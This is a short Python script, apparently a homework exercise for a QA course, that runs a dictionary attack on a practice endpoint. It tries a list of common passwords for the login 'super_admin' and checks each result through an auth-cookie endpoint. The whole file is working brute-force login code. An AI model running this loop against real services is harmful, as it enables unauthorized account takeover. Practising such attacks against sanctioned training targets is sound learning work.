import requests

list_of_passwords = ['!@#$%^&*', '000000', '111111', '121212', '123123', '1234', '12345', '123456', '1234567', '12345678',
             '123456789', '1234567890', '123qwe', '1q2w3e4r', '1qaz2wsx', '555555', '654321', '666666', '696969',
             '7777777', '888888', 'Football', 'aa123456', 'abc123', 'access', 'admin', 'adobe123', 'ashley', 'azerty',
             'bailey', 'baseball', 'batman', 'charlie', 'donald', 'dragon', 'flower', 'football', 'freedom', 'hello',
             'hottie', 'iloveyou', 'jesus', 'letmein', 'login', 'lovely', 'loveme', 'master', 'michael', 'monkey',
             'mustang', 'ninja', 'passw0rd', 'password', 'password1', 'photoshop', 'princess', 'qazwsx', 'qwerty',
             'qwerty123', 'qwertyuiop', 'shadow', 'solo', 'starwars', 'sunshine', 'superman', 'trustno1', 'welcome',
             'whatever', 'zaq1zaq1']

failed_answer = "You are NOT authorized"
success_answer = "You are authorized"
answer = ""
number_of_password_in_the_list = -1
while answer != success_answer:
    number_of_password_in_the_list += 1
    if number_of_password_in_the_list == len(list_of_passwords):
        print("Your password is not listed in the list of most popular passwords.")
        break
    payload = {"login": "super_admin", "password": list_of_passwords[number_of_password_in_the_list]}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    answer = response2.text
    print(f"{number_of_password_in_the_list + 1} password/s of {len(list_of_passwords)} is checked.")
else:
    print(f"Correct password has been found! Password: '{list_of_passwords[number_of_password_in_the_list]}'.")
